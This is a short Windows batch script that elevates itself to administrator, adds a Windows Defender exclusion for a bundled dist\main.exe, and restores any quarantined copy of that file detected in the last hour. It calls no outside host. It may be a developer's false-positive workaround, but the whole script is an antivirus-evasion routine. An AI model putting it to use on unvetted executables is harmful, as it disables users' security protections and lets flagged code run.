@echo off
:: Check if the script is running with admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    PowerShell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

SETLOCAL

:: Set the file path relative to the batch file (in the dist folder)
SET "FILE_PATH=%~dp0dist\main.exe"

:: Add exclusion to Windows Defender for the specific file
echo Adding exclusion for %FILE_PATH% to Windows Defender...
PowerShell -Command "Add-MpPreference -ExclusionPath '%FILE_PATH%'" || (
    echo Failed to add exclusion to Windows Defender.
    pause
    exit /b 1
)

:: Use PowerShell to find quarantined items within the last hour and restore them
echo Scanning for quarantined threats in the last hour and attempting recovery...

PowerShell -Command "$ErrorActionPreference = 'Stop'; try { $OneHourAgo = (Get-Date).AddHours(-1); $QuarantinedItems = Get-MpThreatDetection | Where-Object { $_.ResourcePath -like '*main.exe' -and $_.InitialDetectionTime -ge $OneHourAgo }; if ($QuarantinedItems) { foreach ($Item in $QuarantinedItems) { Write-Host 'Restoring:' $Item.ResourcePath; & 'C:\Program Files\Windows Defender\MpCmdRun.exe' -Restore -Name $Item.ThreatID; } } else { Write-Host 'No file name ending in main.exe found in the last hour.' } } catch { Write-Host 'An error occurred during scanning or restoration: ' $_.Exception.Message; exit 1; }" || (
    echo Failed to scan or restore quarantined items.
    pause
    exit /b 1
)

echo Done!
pause
ENDLOCAL
